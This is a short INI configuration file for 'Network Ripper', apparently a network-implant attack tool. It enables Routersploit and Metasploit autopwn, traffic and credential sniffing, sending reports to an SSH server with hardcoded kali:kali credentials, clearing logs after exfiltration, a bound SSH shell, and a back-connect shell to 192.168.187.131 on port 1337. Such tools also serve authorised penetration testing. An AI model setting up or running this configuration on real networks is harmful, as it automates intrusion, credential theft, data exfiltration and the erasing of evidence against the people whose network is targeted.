[settings]

# Used Network Interface
used_interface = eth0

#Enable network scan script?
network_scan = true

#Enable MNDP, LLDP, CDP, OSPF VRRP, LLMNR parsing?
protocols_parsing = true

#Enable Routersploit autopwn attack?
routersploit_autopwn = true

#Enable Metasploit autopwn attack?
metasploit_autopwn = true

#Enable tshark traffic sniffing?
tshark_traffic_sniffing = true

#Tshark traffic capture time in seconds (default 600 - 10 minutes)
tshark_traffic_capture_time = 60

#Enable CredsLayer traffic sniffing?
credslayer_traffic_sniffing = true

#CredsLayer traffic capture time in seconds (default 600 - 10 minutes)
credslayer_traffic_capture_time =  60

#Send report to the SSH server?
send_report_to_ssh_server = true

#SSH server creds (IP:Login:Pass)
report_ssh_server_creds = 192.168.187.131:kali:kali

#Clear logs after sending report?
clear_logs_after_sending_report = true

#Uninstall Network Ripper software after sending report?
uninstall_network_ripper_after_sending_report = false

#Bind SSH shell at Network Ripper?
bind_ssh_shell = true

#Enable back connect from Network Ripper?
back_connect_shell = true

#Backconnect IP
back_connect_shell_ip = 192.168.187.131

#Backconnect Port
back_connect_shell_port = 1337

#Back connect replay timeout (default 5 minutes)
back_connect_shell_timeout = 2

[report_path]
base_path = ./report
log_path = ./report/log
attacks_path = ./report/Attacks
network_information_path = ./report/Network_Information
sniff_path = ./report/Sniff